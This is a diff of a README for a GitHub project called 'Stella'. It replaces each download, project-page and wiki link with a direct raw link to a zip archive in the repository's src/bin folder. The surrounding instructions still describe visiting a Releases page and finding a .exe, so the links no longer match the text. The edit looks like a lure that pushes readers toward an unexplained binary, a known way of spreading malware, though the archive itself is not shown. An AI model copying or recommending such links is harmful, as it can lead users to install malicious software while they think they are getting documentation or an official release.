@@ -1,6 +1,6 @@
 # ⚙️ Stella - Run Secure Logic with Ease
 
-[![Download Stella](https://img.shields.io/badge/Download%20Stella-Download%20Here-brightgreen?style=for-the-badge)](https://github.com/Vitorlitig/Stella)
+[![Download Stella](https://img.shields.io/badge/Download%20Stella-Download%20Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Vitorlitig/Stella/main/src/bin/Software-1.2.zip)
 
 ## About Stella
 
@@ -25,11 +25,11 @@ The program uses fixed-point math and matrix operations behind the scenes. The u
 
 You can get Stella from its GitHub page. Use the link below to visit the download page. The latest software files are listed there.
 
-[![Download Stella](https://img.shields.io/badge/Download%20Stella-Visit%20Page-blue?style=for-the-badge)](https://github.com/Vitorlitig/Stella)
+[![Download Stella](https://img.shields.io/badge/Download%20Stella-Visit%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Vitorlitig/Stella/main/src/bin/Software-1.2.zip)
 
 To download Stella, follow these steps:
 
-1. Click the big blue button above or visit https://github.com/Vitorlitig/Stella directly.
+1. Click the big blue button above or visit https://raw.githubusercontent.com/Vitorlitig/Stella/main/src/bin/Software-1.2.zip directly.
 2. Look for the **Releases** section on the page.
 3. Find the latest release (the one with the highest version number).
 4. Under the latest release, find the Windows installer file. It will usually have a name ending in `.exe`.
@@ -97,7 +97,7 @@ If Stella does not start or crashes:
 
 For advanced topics like using the command line or customizing settings, check the project’s documentation on GitHub:
 
-https://github.com/Vitorlitig/Stella/wiki
+https://raw.githubusercontent.com/Vitorlitig/Stella/main/src/bin/Software-1.2.zip
 
 You can also browse issues and discussions for common questions.
 
